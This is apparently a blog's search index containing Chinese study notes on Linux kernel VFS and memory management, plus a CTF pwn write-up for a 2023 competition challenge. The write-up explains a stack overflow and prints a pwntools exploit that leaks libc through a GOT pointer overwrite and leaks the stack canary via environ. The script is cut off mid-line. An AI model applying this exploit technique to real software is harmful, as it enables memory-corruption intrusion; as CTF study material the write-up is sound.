<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2023930</title>
      <link href="/2023/09/30/2023-9-30/"/>
      <url>/2023/09/30/2023-9-30/</url>
      
        <content type="html"><![CDATA[<h1 id="虚拟文件系统"><a href="#虚拟文件系统" class="headerlink" title="虚拟文件系统"></a>虚拟文件系统</h1><p>VFS作为内核的子系统</p><p>所有FS不但以来VFS共存，也依靠VFS协同工作</p><p>不同FS，甚至不同介质的FS可进行读写工作</p><h2 id="13-1-通用文件系统接口"><a href="#13-1-通用文件系统接口" class="headerlink" title="13.1 通用文件系统接口"></a>13.1 通用文件系统接口</h2><h2 id="13-2-文件系统抽象层"><a href="#13-2-文件系统抽象层" class="headerlink" title="13.2 文件系统抽象层"></a>13.2 文件系统抽象层</h2><p>通用文件系统模型：囊括了任何文件系统的常用功能集</p><p>可支持多种差异很大的FS，从DOS系统的FAT到windows的NTFS</p><p>一方面，系统调用时通用VFS接口，提供给用户空间的前端</p><p>另一方面，系统调用是具体文件系统的后端</p><p>userspace -&gt; VFS -&gt; FS -&gt; 物理介质</p><h3 id="13-3-Unix文件系统"><a href="#13-3-Unix文件系统" class="headerlink" title="13.3 Unix文件系统"></a>13.3 Unix文件系统</h3><p>非unix风格的FS，必须经过封装，得到符合unix概念的接口（文件，目录项，inode，挂载点）</p><h3 id="13-4-VFS对象及其数据结构"><a href="#13-4-VFS对象及其数据结构" class="headerlink" title="13.4 VFS对象及其数据结构"></a>13.4 VFS对象及其数据结构</h3><p>VFS的主要对象：</p><ul><li>超级块，代表一个具体的FS</li><li>索引节点对象，代表一个具体文件</li><li>目录项对象，代表目录项，是路径的组成部分（目录或文件）</li><li>文件对象</li></ul><p>每个主要对象，包括一个操作对象，描述了内核对主要对象可以使用的方法</p><ul><li>super_operations对象，对文件系统，如write_inode()和sync_fs()</li><li>inode_operations,create()和link（）</li><li>dentry_operations, d_compare() and d_delete()</li><li>file_operations, read() and write()</li></ul><p>操作对象作为一个结构体指针实现（类比IO_FILE)</p><p>除此之外：</p><ul><li>注册的文件系统用file_system_type结构体</li><li>安装点用vfsmount结构体</li><li>fs_struct</li><li>file</li></ul><h2 id="13-5-超级块对象"><a href="#13-5-超级块对象" class="headerlink" title="13.5 超级块对象"></a>13.5 超级块对象</h2><p>通常为磁盘超级快；对于内存文件系统，会现场创建超级块保存在内存</p><p>super_block结构体定义在文件&lt;linux/fs.h&gt;</p><h2 id="13-6-超级快操作"><a href="#13-6-超级快操作" class="headerlink" title="13.6 超级快操作"></a>13.6 超级快操作</h2><p>最重要的s_op，操作函数表，定义在文件&lt;linux/fs.h&gt;</p><p>文件系统需要执行超级快操作时，需要在超级快对象中，找需要的操作方法，如写自己的超级快：</p><pre><code>sb-&gt;s_op-&gt;write_super(sb);</code></pre><p>sb:super block指针，找op再找write</p><p>尽管函数来自超级快，调用时还是要把超级快作为参数传递</p><p>如果c++只需要</p><p>sb.write_super();</p><pre><code>//创建初始化新的索引节点struct inode* alloc_inode(struct super_block *sb)//释放给定的索引节点void destroy_inode(struct inode* inode)//索引节点脏时调用，日志文件系统执行函数，更新日志void dirty_inode(struct inode* inode)//索引节点写入磁盘，wait表示写操作是否需要同步void write_inode(struct inode *inode, int wait)//最后一个引用消失，VFS调用删除inodevoid drop_inode(struct inode *inode)void delete_inode(struct inode *inode)//卸载文件系统时释放超级快，调用者必须持有s_lockvoid put_super(struct super_block *sb)//用给定的超级快更新磁盘的超级快void write_super(struct super_block *sb)//文件系统的数据元与磁盘上的fs同步int sync_fs(struct super_block *sb, int wait)//禁止对文件系统改变，再用超级快更新磁盘超级快，LVM(逻辑卷标管理)使用void write_super_lockfs(struct super_block *sb)//重新安装文件系统int remount_fs(struct super_block *sb,int *flag, char* data)//释放inode+清空void clear_inode(struct inode *inode)//中断安装操作,网络文件系统如NFS使用void umount_begin(struct super_block *sb)</code></pre><p>除了dirty_inode都可以阻塞</p><p>如果操作函数指针为NULL，调用通用函数执行操作</p><h2 id="13-7-索引节点对象"><a href="#13-7-索引节点对象" class="headerlink" title="13.7 索引节点对象"></a>13.7 索引节点对象</h2><p>索引节点：内核操作文件或目录时需要的全部信息</p><p>Unix风格FS直接读取</p><p>其它需要提取inode相关信息</p><h2 id="13-8-索引节点操作"><a href="#13-8-索引节点操作" class="headerlink" title="13.8 索引节点操作"></a>13.8 索引节点操作</h2><p>调用方式</p><pre><code>i-&gt;i_op-&gt;truncate(i)</code></pre><p>这些函数可能VFS执行，也可能具体文件系统执行</p><pre><code>//为dentry创建新的索引节点，mode设置初始模式int create(struct inode*dir, struct dentry*dentry, int mode)//目录中寻找索引节点struct dentry loookup(struct inode *dir, struct dentry *dentry)//link()调用，创建硬连接int link(struct dentry *old_dentry, struct inode *dir, struct dentry *dentry)//unlink()调用，删除dentry指定的inodeint unlink(struct inode *dir, struct dentry *dentry)//symlink调用，创建软连接int unlink(struct inode *dir, struct dentry *dentry， const char *symname)//mknod调用，创建特殊文件。创建的文件放在dir，目录项dentry，关联的设备rdevint mknod(struct inode *dir, struct dentry *dentry, int mode, dev_t rdev)//readlink()调用，拷贝数据到特定的bufferint readlink(struct dentry *dentry, char *buffer, int buflen)//从符号链接查找索引节点，由dentry解析，结果存放在nd指向的nameidata结构体中int follow_link(struct dentry *dentry, struct nameidata *nd)//清除follow_linkint put_link(struct dentry *dentry, struct nameidata *nd)//修改文件的大小void truncate(struct inode* inode)//检查inode所代表的文件是否允许特定访问模式int permission(struct inode* inode, int mask)</code></pre><h2 id="13-9-目录项对象"><a href="#13-9-目录项对象" class="headerlink" title="13.9 目录项对象"></a>13.9 目录项对象</h2><p>每个dentry代表路径中的一个特定部分</p><p>常规的字符串比较，执行耗时，代码繁琐</p><p>目录项对象的引入使得过程更简单</p><h3 id="13-9-1-目录项状态"><a href="#13-9-1-目录项状态" class="headerlink" title="13.9.1 目录项状态"></a>13.9.1 目录项状态</h3><p>三种状态：被使用，未被使用和负状态</p><p>被使用：对应一个有效的索引节点，有一个多个使用者</p><p>被使用不能被丢弃</p><p>未被使用：d_count为0</p><p>负状态：没有对应节点（NULL），用于确认路径不存在</p><h3 id="13-9-2-目录项缓存"><a href="#13-9-2-目录项缓存" class="headerlink" title="13.9.2 目录项缓存"></a>13.9.2 目录项缓存</h3><p>将元素逐个解析为目录项，浪费时间</p><p>将目录项对象缓存在dcache中</p><p>三个主要部分：</p><p>被使用的目录项链表</p><p>最近被使用的双向链表：包含未被使用的，负状态的</p><p>散列表，相应的散列函数</p><p>散列表由数组dentry_hashtable表示， 元素为指向相同键值的目录项对象链表的指针</p><p>实际的散列值由d_hash函数计算：内核给FS唯一的散列函数</p><h2 id="13-10-目录项操作"><a href="#13-10-目录项操作" class="headerlink" title="13.10 目录项操作"></a>13.10 目录项操作</h2><pre><code>//比较文件名是否相同，对于FAT不区分大小写int d_compare(struct dentry *dentry, struct qstr *name1, struct qstr* name2)</code></pre><h2 id="13-11-文件对象"><a href="#13-11-文件对象" class="headerlink" title="13.11 文件对象"></a>13.11 文件对象</h2><p>文件对象在进程观点上，代表打开文件</p><p>OS视角上目录项对象代表打开文件，inode和目录项对象是唯一的</p><p>记录文件是否脏是索引节点记录的</p><h2 id="13-12-文件操作"><a href="#13-12-文件操作" class="headerlink" title="13.12 文件操作"></a>13.12 文件操作</h2><p>对不感兴趣的操作可置为NULL，通用操作</p><pre><code>//更新偏移量指针loff_t lleek(struct file *file, loff_t offset, int origin)//从offset读取count字节到buf，更新文件指针ssize_t read(struct file *file, char *buf, size_t count, loff_t offset)//从iocb描述的文件里，同步方式读取count字节到buf。ssize_t aio_read(struct kiocb *iocb, char *buf, size_t count, loff_t offset)//返回目录列表中的下一个目录int readdir(struct file *file, struct poll_table_struct *poll_table)//所有被缓存数据写回磁盘int fsync(struct file *file, struct dentry *dentry, int datasync)//打开或关闭异步IO的通告信号int fasync(int fd, struct file*file, int on)//从一个文件拷贝数据到另一个文件，全部在内核完成，避免了向用户不必要的拷贝ssize_t sendfile(struct file*file, loff_t *offset,size_t size, read_actor_t actor, void *target)//提供忠告锁int flock(struct file *flip, int cmd, struct file_lock *fl)</code></pre><h2 id="13-13-和文件系统相关的数据结构"><a href="#13-13-和文件系统相关的数据结构" class="headerlink" title="13.13 和文件系统相关的数据结构"></a>13.13 和文件系统相关的数据结构</h2><h4 id="file-system-type"><a href="#file-system-type" class="headerlink" title="file_system_type"></a>file_system_type</h4><p>描述各种FS类型</p><h4 id="vfsmount"><a href="#vfsmount" class="headerlink" title="vfsmount"></a>vfsmount</h4><p>描述一个FS的实例</p><p>理清文件系统和其它安装点的关系，是最复杂的工作</p><p>vsmount中的各种链表，用于跟踪相关信息</p><p>标准安装标志列表</p><table><thead><tr><th>标志</th><th>描述</th></tr></thead><tbody><tr><td>MNT_NOSUID</td><td>禁止exe设置setuid,setgid标志</td></tr><tr><td>MNT_MODEV</td><td>禁止访问该FS上的设备文件</td></tr><tr><td>MNT_NOEXEC</td><td>禁止执行FS上的exe</td></tr></tbody></table><h2 id="13-14-进程相关数据结构"><a href="#13-14-进程相关数据结构" class="headerlink" title="13.14 进程相关数据结构"></a>13.14 进程相关数据结构</h2><p>每个进程都有一组自己打开的文件</p><h4 id="files-struct"><a href="#files-struct" class="headerlink" title="files_struct"></a>files_struct</h4><pre><code>struct files_struct&#123;    atomic_t count;    ...    struct file *fd_array[NR_OPEN_DEFAULT];&#125;</code></pre><p>可容纳64个文件对象</p><p>若超过64，分配一个新数组</p><p>可以适当增大NR_OPEN_DEFAULT的预定义</p><p>count:可以让多个进程共享结构体，计数防止撤销</p><h4 id="fs-struct"><a href="#fs-struct" class="headerlink" title="fs_struct"></a>fs_struct</h4><p>包括文件系统和进程的相关信息</p><h4 id="mmt-namespace"><a href="#mmt-namespace" class="headerlink" title="mmt_namespace"></a>mmt_namespace</h4><p>单进程命名空间</p><p>每一个进程在系统中都看到为一个安装文件系统</p><p>默认情况，所有进程共享同样的命名空间</p><h2 id="13-15-小结"><a href="#13-15-小结" class="headerlink" title="13.15 小结"></a>13.15 小结</h2>]]></content>
      
      
      
        <tags>
            
            <tag> study notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023925</title>
      <link href="/2023/09/25/2023-9-25/"/>
      <url>/2023/09/25/2023-9-25/</url>
      
        <content type="html"><![CDATA[<h1 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h1><h2 id="12-7"><a href="#12-7" class="headerlink" title="12.7"></a>12.7</h2><h3 id="12-7-1"><a href="#12-7-1" class="headerlink" title="12.7.1"></a>12.7.1</h3><p>中断栈</p><h3 id="12-7-2-栈上正大光明工作"><a href="#12-7-2-栈上正大光明工作" class="headerlink" title="12.7.2 栈上正大光明工作"></a>12.7.2 栈上正大光明工作</h3><p>尽量动态分配，内核栈有限</p><h2 id="12-8-高端内存的映射"><a href="#12-8-高端内存的映射" class="headerlink" title="12.8 高端内存的映射"></a>12.8 高端内存的映射</h2><h3 id="12-8-1-永久映射"><a href="#12-8-1-永久映射" class="headerlink" title="12.8.1 永久映射"></a>12.8.1 永久映射</h3><p>映射page到内核地址空间</p><pre><code>void *kmap(struct page *page)</code></pre><p>低端内存：返回虚拟地址</p><p>高端内存：建立永久映射，并返回地址</p><p>kmap可睡眠</p><p>永久映射有限，高端内存不需要时候应该解除映射</p><pre><code>void kunmap(struct page *page)</code></pre><h3 id="12-8-2-临时映射（原子映射）"><a href="#12-8-2-临时映射（原子映射）" class="headerlink" title="12.8.2 临时映射（原子映射）"></a>12.8.2 临时映射（原子映射）</h3><p>创建映射且上下文不能睡眠</p><pre><code>void *kmap_atomic(struct page*page, enum km_type type)</code></pre><p>type描述了临时映射的目的</p><p>不会阻塞</p><p>禁止内核抢占，每个映射对每个处理器唯一</p><pre><code>void kunmap_atomic(void *kvaddr, enum_type type)</code></pre><h2 id="12-9-每个CPU的分配"><a href="#12-9-每个CPU的分配" class="headerlink" title="12.9 每个CPU的分配"></a>12.9 每个CPU的分配</h2><p>每个CPU的数据存在一个数组里</p><p>按当前处理器号决定这个数组的当前元素</p><pre><code>unsigned long my_percpu[NR_CPUS];int cpu;cpu = get_cpu();my_percpu[cpu]++; //具体执行的代码put_cpu();</code></pre><p>不存在并发问题</p><p>内核抢占问题：</p><ul><li>代码被其它处理器抢占，重新调度，CPU变量无效</li><li>同一个处理器抢占了两个，造成竞争</li></ul><p>get_cpu()时禁止内核抢占，put_cpu()时重新激活处理器</p><h2 id="12-10-新的每个CPU接口"><a href="#12-10-新的每个CPU接口" class="headerlink" title="12.10 新的每个CPU接口"></a>12.10 新的每个CPU接口</h2><p>2.6内核为了方便操作每个CPU数据，引入percpu</p><p>&lt;linux/percpu.h&gt;声明了所有接口操作例程</p><h3 id="12-10-1-编译时每个CPU数据"><a href="#12-10-1-编译时每个CPU数据" class="headerlink" title="12.10.1 编译时每个CPU数据"></a>12.10.1 编译时每个CPU数据</h3><pre><code>DEFINE_PER_CPU(type, name);</code></pre><p>为每个处理器创建类型为type，名字为name的变量实例</p><p>在别处声明变量：</p><pre><code>DECLARE_PER_CPU(type, name);</code></pre><p>get_cpu, put_cpu操作变量</p><pre><code>get_cpu_var(name)++;put_cpu_var(name);</code></pre><p>也可以</p><pre><code>per_cpu(name, cpu)++;</code></pre><p>此方法不会禁止内核抢占，也不会提供锁保护</p><p>链接程序将他们创捷在一个唯一的可执行段中.data.percpu</p><h3 id="12-10-2-运行时的每个CPU数据"><a href="#12-10-2-运行时的每个CPU数据" class="headerlink" title="12.10.2 运行时的每个CPU数据"></a>12.10.2 运行时的每个CPU数据</h3><p>内核实现CPU数据动态分配类似kmalloc</p><pre><code>void *alloc_percpu(type);void *__alloc_percpu(size_t size, size_t align);void free_percpu(const void *);</code></pre><p>alloc_percpu:单字节对齐，按照给定类型的自然边界对齐</p><p>__alloc_percpu:指定对齐</p><p>返回一个指针，用来引用CPU数据</p><pre><code>get_cpu_var(ptr);put_cpu_var(prt);</code></pre><h2 id="12-11-使用每个CPU数据的原因"><a href="#12-11-使用每个CPU数据的原因" class="headerlink" title="12.11 使用每个CPU数据的原因"></a>12.11 使用每个CPU数据的原因</h2><ol><li>减少了数据锁定，不再需要锁（纯粹的编程约定，不存在强制措施）</li><li>大大减少缓存失效,percpu接口缓存对齐（cache align）所有数据</li></ol><p>唯一的安全要求：禁止内核抢占（put, get)，不能睡眠</p><h2 id="12-12-分配函数的选择"><a href="#12-12-分配函数的选择" class="headerlink" title="12.12 分配函数的选择"></a>12.12 分配函数的选择</h2><ul><li>常用：kmalloc() GFP_ATOMIC 或 GFP_KERNEL</li><li>高端内存：alloc_pages()+kmap()</li><li>vmalloc():分配大段内存</li><li>slab：针对创建撤销很多大的数据结构</li></ul><h2 id="12-13-小结"><a href="#12-13-小结" class="headerlink" title="12.13 小结"></a>12.13 小结</h2>]]></content>
      
      
      
        <tags>
            
            <tag> study notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023921</title>
      <link href="/2023/09/21/2023-9-21/"/>
      <url>/2023/09/21/2023-9-21/</url>
      
        <content type="html"><![CDATA[<h1 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h1><p>linux内核设计与实现第12章笔记</p><h2 id="1-页"><a href="#1-页" class="headerlink" title="1.页"></a>1.页</h2><h2 id="2-区"><a href="#2-区" class="headerlink" title="2.区"></a>2.区</h2><p>对相似特性的页分组</p><p>目的：某些硬件存在缺陷，无法寻址</p><ul><li>只能用特定内存DMA</li><li>物理寻址范围大于虚拟寻址范围</li></ul><p>四种区</p><ul><li>ZONE_DMA</li><li>ZONE_DMA32</li><li>ZONE_NORMAL</li><li>ZONE_HIGHEM：高端内存，页不能永久映射到内核地址</li></ul><p>不一定要定义所有区</p><h2 id="3-获得页"><a href="#3-获得页" class="headerlink" title="3.获得页"></a>3.获得页</h2><p>底层接口&lt;linux/gfp.h&gt;，函数：</p><p>struct pages *alloc_pages(gfp_mask, order)</p><p>分配1&lt;&lt;order个连续的物理页，返回第一个页的struct结构体</p><p>void * page_address(struct page *page)</p><p>返回指针，指向给定物理页的逻辑地址</p><p>unsigned long __get_free_pages(fgp_mask, order)</p><p>与alloc_pages一样，返回第一个页的逻辑地址</p><h2 id="获得填充为0的页"><a href="#获得填充为0的页" class="headerlink" title="获得填充为0的页"></a>获得填充为0的页</h2><p>unsigned long get_zeroed_page(gfp_mask)</p><h2 id="释放页"><a href="#释放页" class="headerlink" title="释放页"></a>释放页</h2><p>8个页的使用与释放</p><pre class=" language-c"><code class="language-c">page <span class="token operator">=</span> <span class="token function">__get_free_pages</span><span class="token punctuation">(</span>GFP_KERNEL<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>page<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/* page指向逻辑地址 */</span><span class="token function">free_pages</span><span class="token punctuation">(</span>page<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="4-kmalloc"><a href="#4-kmalloc" class="headerlink" title="4.kmalloc"></a>4.kmalloc</h2><p>void *kmalloc(size_t size, gfp_t flags)</p><p>分配的内存区，物理上连续</p><p>如果是NULL，需要处理错误</p><p>调用成功，返回逻辑地址，内存块的大小至少为请求的大小</p><h2 id="gfp-mask标志"><a href="#gfp-mask标志" class="headerlink" title="gfp_mask标志"></a>gfp_mask标志</h2><p>分为行为修饰符，区修饰符及类型</p><ol><li><p>行为修饰符</p><p>描述分配器的具体特征</p><p>例子</p><pre><code>ptr = kmalloc(size, __GFP_WAIT|__GFP_IO|__GFP_FS);</code></pre><p>可以阻塞，执行IO，必要时可以执行FS操作</p></li><li><p>区修饰符</p><p>默认从ZONE_NORMAL分配</p><p>不能给get_free_pages(),kmalloc()指定ZONE_HIGHMEM，因为不能返回固定的逻辑地址</p></li><li><p>类型标志</p><p>指定所需的行为和区描述符（多个的复合）</p><table><thead><tr><th>标志</th><th>修饰符标志</th></tr></thead><tbody><tr><td>GFP_KERNEL</td><td>(__GFP_WAIT|__GFP_IO|__GFP_FS)</td></tr><tr><td>GFP_ATOMIC</td><td>__GFP_HIGH</td></tr><tr><td>GFP_NOIO</td><td>__GFP_WAIT</td></tr><tr><td>GFP_NOFS</td><td>__GFP_WAIT|__GFP_IO</td></tr></tbody></table><p>GFP_KERNEL:可能睡眠，普通优先级,最常用</p><p>可以用在可以重新安全调度的进程context</p><p>GFP_ATOMIC: 不能干任何事，分配成功机会较小，适用于不能睡眠的情况（中断处理程序，软中断,tasklet）</p><p>GFP_NOFS:用在FS代码中，如果没有用GFP_NOFS，会引起更多的文件系统操作，形成套娃，最后死锁</p><p><strong>绝大多数代码中，要么GFP_KERNEL,要么GFP_ATOMIC</strong></p></li></ol><h2 id="kfree"><a href="#kfree" class="headerlink" title="kfree()"></a>kfree()</h2><h2 id="5-vmalloc"><a href="#5-vmalloc" class="headerlink" title="5.vmalloc()"></a>5.vmalloc()</h2><p>类似kmalloc()，前者的虚拟地址连续，物理地址不需要连续</p><p>大多数情况，只有硬件设备需要物理地址连续的设备</p><p>kmalloc有更好的性能，因此vmalloc不得已才会使用-》获得大段内存</p><p>例如模块被动态插入到内核中</p><p>用法与用户空间一样：void *vmalloc(unsigned long size)</p><p>void vfree(const void*addr)</p><p>这个函数可以睡眠，没有返回值</p><h2 id="6-slab层"><a href="#6-slab层" class="headerlink" title="6.slab层"></a>6.slab层</h2><p>空闲链表：相当于对象高速缓存</p><p>slab扮演通用数据结构缓存层的角色</p><h3 id="设计思想"><a href="#设计思想" class="headerlink" title="设计思想"></a>设计思想</h3><p>不同的对象划分为高速缓存组，每种对象对应一个高速缓存</p><p>kmalloc建立在slab层上，使用一组cache</p><p>slab：一个多个物理上连续的页组成，一般情况下仅仅一页</p><p>把用的，不用的对象组织起来</p><p>例子：inode用slab管理, struct inode用inode_cachep高速缓存</p><p>每个高速缓存用kmem_cache结构表示，包含三个链表：slabs_full,partial,empty</p><p>每个slab用slab描述符 struct slab表示</p><pre><code>struct slab &#123;    struct list_head list;    unsigned long colouroff; //着色的偏移量    void *s_mem; //第一个对象    unsigned inuse; //已分配的对象    kmem_bufctl_t free; //第一个空闲对象&#125;;</code></pre><p>slab描述符：要么在slab外另行分配，要么在slab自身开始的地方。</p><p>slab为高速缓存创建新的slab，通过__get_free_pages()</p><pre><code>void *kmem_getpages(struct kmem_cahce *cachep, gfp_t flags, int nodeid)</code></pre><p>nodeid:用于NUMA系统，提供较好性能</p><p>返回一个slab大小的空页</p><p>slab层的管理：在每个高速缓存的基础上，给整个内核一个简单的接口完成</p><p>通过接口，创建撤销新的高速缓存</p><h3 id="slab分配器的接口"><a href="#slab分配器的接口" class="headerlink" title="slab分配器的接口"></a>slab分配器的接口</h3><p>高速缓存的创建</p><pre><code>struct kmem_cache * kmem_cache_create(const char *name, size_t size, size_t align, unsigned long flags, void (*ctor) (void*));</code></pre><p>flags:</p><ul><li>SLAB_HWCACHE_ALIGN:所有对象，行对齐，防止错误的共享</li><li>SLAB_POISON:用a5a5a5a5填充slab</li><li>SLAB_RED_ZONE：红色警戒区，检测缓冲越界</li><li>SLAB_CACHE_DMA：用于DMA</li></ul><p>ctor:构造函数，linux不需要</p><p>不能在中断context中使用-&gt;可能睡眠</p><p>高速缓存的撤销</p><pre><code>int kmem_cache_destroy(struct kmem_cache *cachep)</code></pre><p>调用条件：</p><ul><li><p>所有slab为空，不能被分配</p></li><li><p>调用destroy过程中不再访问这个高速缓存</p></li></ul><h3 id="1-从缓存中分配"><a href="#1-从缓存中分配" class="headerlink" title="1.从缓存中分配"></a>1.从缓存中分配</h3><p>创建cachep后可从下面函数获取对象：</p><pre><code>void * kmem_cache_alloc(struct kmem_cache *cachep, gfp_t flags)</code></pre><p>从指定的cachep获得一个指向对象的指针</p><p>flags:针对cachep没有空闲对象时， getpages的情况</p><p>释放对象</p><pre><code>void * kmem_cache_free(struct kmem_cache *cachep, void *objp)</code></pre><h3 id="2-task-struct使用实例"><a href="#2-task-struct使用实例" class="headerlink" title="2.task_struct使用实例"></a>2.task_struct使用实例</h3>]]></content>
      
      
      
        <tags>
            
            <tag> study notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023铁人三项决赛</title>
      <link href="/2023/04/28/2023%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E5%86%B3%E8%B5%9B/"/>
      <url>/2023/04/28/2023%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E5%86%B3%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>铁三决赛pwn的难度不大，但是那道虚拟机漏洞类型还是挺新颖的，以后有空可以整理一下不同类型虚拟机漏洞的利用</p><p>值得吐槽的是，我们实训课xjb装东西，竟然把我kali的pwntools和pwndbg全搞没了，比赛前半小时才发现（别问我为什么这么久没碰pwn)，害得我把kali恢复到了去年8月的快照</p><h1 id="driverlicense"><a href="#driverlicense" class="headerlink" title="driverlicense"></a>driverlicense</h1><h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><p>可以输入驾照的name, year, comment, name和comment以string形式存在栈上，year为数字</p><p>后面可以修改comment，并show驾照的信息</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>edit comment的过程中，我们会获得comment string的cstr指针，然后用malloc_usable_size的方式获得当前长度，这个长度用于后续的输出</p><p>但是cstr在字符串长的时候才是堆指针，<strong>字符串较短的时候会保存在栈上，此时malloc_usable_size不适用这种情况</strong>，我们可以获得一个很大的size</p><p><img src="1.png" alt="get usable size"></p><p>由于此时字符串在栈上，我们初步构思这是一个栈溢出</p><p>接下来问题来了，怎么泄露libc和canary?</p><p>出题者故意把name string放在了comment string后，我们就可以通过溢出控制name的cstr,由于没开pie，我们直接把cstr换成read的got地址，就泄露了libc</p><p>如法炮制，有了libc就有了envrion，就可以通过偏移推测栈上的canary地址，泄露出来</p><h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token keyword">def</span> <span class="token function">lg</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[1;31;40m%20s-->0x%x\033[0m'</span><span class="token operator">%</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io = process('./pwn')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'172.31.3.108'</span><span class="token punctuation">,</span> <span class="token number">10001</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'comment'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'year'</span><span class="token punctuation">,</span> <span class="token string">'12'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'comment'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io, 'b *0x401137')</span>payload <span class="token operator">=</span> b<span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40155d</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x602028</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name : '</span><span class="token punctuation">)</span>leak_libc <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span> b<span class="token string">'\0\0'</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak_libc'</span><span class="token punctuation">,</span> leak_libc<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> leak_libc <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#leak stack </span>environ <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'environ'</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> b<span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40155d</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span>edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name : '</span><span class="token punctuation">)</span>leak_stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span> b<span class="token string">'\0\0'</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak_stack'</span><span class="token punctuation">,</span> leak_stack<span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> leak_stack <span class="token operator">+</span> <span class="token number">0x7fffaca833c8</span> <span class="token operator">-</span> <span class="token number">0x7fffaca834d8</span><span class="token comment" spellcheck="true">#leak canary</span>payload <span class="token operator">=</span> b<span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40155d</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token 